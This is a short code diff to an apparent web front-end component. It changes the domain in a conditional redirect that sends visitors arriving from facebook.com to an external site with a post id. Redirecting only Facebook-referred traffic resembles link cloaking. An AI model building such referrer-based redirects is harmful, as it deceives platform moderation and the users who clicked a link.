@@ -10,7 +10,7 @@ function Home() {
     
     var referrer = document.referrer || null;
     if (referrer && referrer.includes('facebook.com')) {
-                window.location.href = "http://todaynew247.com/?p=" + id;
+                window.location.href = "http://mypetpuppyshop.com/?p=" + id;
             }
          console.log(referrer);
     return 
